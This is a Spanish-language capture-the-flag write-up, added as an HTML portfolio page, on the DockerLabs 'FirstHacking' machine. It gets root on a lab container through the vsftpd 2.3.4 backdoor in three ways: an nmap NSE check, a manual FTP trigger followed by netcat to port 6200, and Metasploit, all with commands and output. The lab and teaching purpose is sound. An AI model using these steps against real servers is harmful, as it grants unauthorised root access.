@@ -1,0 +1,177 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>FirstHacking · DockerLabs</title>
+  <meta name="description" content="Explotación de la famosa puerta trasera en vsftpd 2.3.4 mediante tres metodologías diferentes para obtener acceso como root.">
+  <meta property="og:title" content="FirstHacking">
+  <meta property="og:description" content="Explotación de la famosa puerta trasera en vsftpd 2.3.4 mediante tres metodologías diferentes para obtener acceso como root.">
+  <meta property="og:type" content="article">
+  <meta name="theme-color" content="#0b0d10">
+  <link rel="icon" type="image/svg+xml" href="favicon.svg">
+  <link rel="stylesheet" href="estilos.css">
+</head>
+<body>
+  <button type="button" class="toc-toggle" aria-label="Abrir índice de máquinas">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01"/></svg>
+  </button>
+  <div class="toc-backdrop"></div>
+  <nav class="toc toc-nav" aria-label="Máquinas">
+    <div class="toc-win"><div class="toc-bar"><span class="term-dot"></span><span class="term-dot"></span><span class="term-dot"></span><span class="toc-title">máquinas</span></div><div class="toc-tree"><a class="toc-home" href="index.html"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 10.5 12 3l9 7.5M5 9.5V20a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V9.5"/><path d="M9.5 21v-6h5v6"/></svg><span>Portfolio</span></a><ul class="tree">
+<li class="tnode tiene-hijos abierto"><button type="button" class="trow trow-plat"><span class="tchev"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m9 6 6 6-6 6"/></svg></span><span class="tlabel">DockerLabs</span><span class="tcount">2</span></button><ul class="tsub">
+<li class="tnode tiene-hijos abierto"><button type="button" class="trow trow-dif"><span class="tchev"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m9 6 6 6-6 6"/></svg></span><span class="tdot dif-muy-facil"></span><span class="tlabel">Muy fácil</span><span class="tcount">2</span></button><ul class="tsub">
+<li><a class="tleaf activo" href="FirstHacking.html">FirstHacking</a></li>
+<li><a class="tleaf" href="obsession.html">Obsession</a></li>
+</ul></li>
+</ul></li>
+</ul></div></div>
+  </nav>
+
+  <div class="wrap">
+    <a class="volver" href="index.html">← Portfolio</a>
+    <header class="masthead">
+      <div class="eyebrow">DockerLabs · Máquina Linux</div>
+      <h1 class="title">FirstHacking</h1>
+      <p class="dek">Explotación de la famosa puerta trasera en vsftpd 2.3.4 mediante tres metodologías diferentes para obtener acceso como root.</p>
+      <div class="meta-row">
+        <span><b>Objetivo</b> 172.17.0.2</span><span><b>Servicios</b> 21/tcp (FTP)</span><span><b>Dificultad</b> Muy fácil</span><span><b>Saltos de usuario</b> 1</span>
+      </div>
+    </header>
+
+    <div class="report">
+      <div class="rail-line"></div>
+      <section class="phase">
+  <div class="phase-node"><span></span></div>
+  <div class="phase-body">
+    <div class="phase-num">Fase 1</div>
+    <h2 class="phase-title">Reconocimiento</h2>
+    <p class="phase-sub">nmap · escaneo de servicios</p>
+    <p>Comenzamos realizando un escaneo exhaustivo sobre la máquina objetivo para identificar puertos abiertos y las versiones de los servicios correspondientes.</p>
+<div class="term">
+  <div class="term-bar">
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-label">nmap</span>
+  </div>
+  <div class="term-body"><pre>\$ nmap -sCV -sS -n -Pn -p- 172.17.0.2
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+MAC Address: 8A:1A:0B:E8:D0:CC (Unknown)
+Service Info: OS: Unix</pre></div>
+</div>
+  </div>
+</section>
+<section class="phase">
+  <div class="phase-node"><span></span></div>
+  <div class="phase-body">
+    <div class="phase-num">Fase 2</div>
+    <h2 class="phase-title">Explotación y Acceso Inicial</h2>
+    
+    <p>La versión <strong>vsftpd 2.3.4</strong> es conocida por contener una puerta trasera (CVE-2011-2523). Si se introduce un nombre de usuario que termine con los caracteres <code>:)</code>, el servicio abre un shell interactivo en el puerto <strong>6200/TCP</strong>.</p>
+<p>A continuación, se detallan los 3 métodos para comprobar y explotar este vector.</p>
+<p>### Método 1: Verificación automatizada con Nmap (NSE)
+Utilizamos el motor de scripts de Nmap (<code>NSE</code>) para comprobar si el objetivo es vulnerable de forma directa y segura.</p>
+<div class="term">
+  <div class="term-bar">
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-label">nmap-nse</span>
+  </div>
+  <div class="term-body"><pre>\$ nmap --script ftp-vsftpd-backdoor -p 21 172.17.0.2
+PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-vsftpd-backdoor: 
+|   VULNERABLE:
+|   vsftpd ext2/ext3 backdoor
+|     State: VULNERABLE (Exploitable)
+|     Description: vsftpd version 2.3.4 contains a backdoor...</pre></div>
+</div>
+<p>### Método 2: Explotación Manual (FTP + Netcat)
+Provocamos la activación de la puerta trasera de forma manual enviando el usuario trampa y conectándonos con <code>netcat</code> al puerto resultante.</p>
+<p>1. Enviamos el disparador a través del cliente FTP tradicional:
+<div class="term">
+  <div class="term-bar">
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-label">ftp-trigger</span>
+  </div>
+  <div class="term-body"><pre>\$ ftp 172.17.0.2
+Connected to 172.17.0.2.
+220 (vsFTPd 2.3.4)
+Name (172.17.0.2:usuario): anonymous:)
+331 Please specify the password.
+Password: password123</pre></div>
+</div>
+*(Nota: La sesión parecerá colgarse. Abrimos una nueva pestaña en nuestra terminal).*</p>
+<p>2. Conectamos al puerto oculto <code>6200</code> que se acaba de abrir en el objetivo:
+<div class="term">
+  <div class="term-bar">
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-label">netcat-connect</span>
+  </div>
+  <div class="term-body"><pre>\$ nc -nv 172.17.0.2 6200
+(UNKNOWN) 6200 (?) open
+id
+uid=0(root) gid=0(root) groups=0(root)</pre></div>
+</div></p>
+<p>### Método 3: Explotación Automatizada con Metasploit
+Hacemos uso del framework Metasploit para automatizar tanto la activación como la recepción de la consola interactiva.</p>
+<div class="term">
+  <div class="term-bar">
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-label">msfconsole</span>
+  </div>
+  <div class="term-body"><pre>\$ msfconsole -q
+msf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOSTS 172.17.0.2
+RHOSTS =&gt; 172.17.0.2
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit
+<p>[*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 172.17.0.2:21 - USER: Sending backdoor command...
+[+] 172.17.0.2:21 - Backdoor service has been spawned, connecting...
+[*] Found shell.
+[*] Command shell session 1 opened (172.17.0.1:4321 -&gt; 172.17.0.2:6200)</p>
+<p>whoami
+root</pre></div>
+</div></p>
+  </div>
+</section>
+<section class="phase root-phase">
+  <div class="phase-node"><span></span></div>
+  <div class="phase-body">
+    <div class="phase-num">Fase 3</div>
+    <h2 class="phase-title">Escalada de privilegios</h2>
+    <p class="phase-sub">usuario → root</p>
+    <p>Debido a la naturaleza de la vulnerabilidad de la puerta trasera en el demonio de vsftpd (el cual corre nativamente con máximos privilegios), <strong>el acceso inicial obtenido por cualquiera de los tres métodos nos otorga directamente una sesión como el usuario administrador (<code>root</code>)</strong>. No se requiere realizar ningún paso adicional de escalada.</p>
+<div class="flag-block">
+  <div class="flag-icon">🗝️</div>
+  <p class="flag-msg">¡Máquina completada! Acceso inmediato conseguido como root a través de la backdoor de vsftpd.</p>
+  <div class="flag-path">uid=0(root) gid=0(root) groups=0(root)</div>
+</div>
+  </div>
+</section>
+    </div>
+
+    <footer class="site-footer">
+      <div class="foot-top">
+        <span>DockerLabs · FirstHacking</span>
+        <span class="foot-right">172.17.0.2 → uid=0</span>
+      </div>
+      <div class="foot-bottom">
+        <span>© snicker. Todos los derechos reservados.</span>
+        <span class="foot-note"><a href="index.html">← Volver al portfolio</a></span>
+      </div>
+    </footer>
+  </div>
+
+  <script src="filtros.js"></script>
+</body>
+</html>
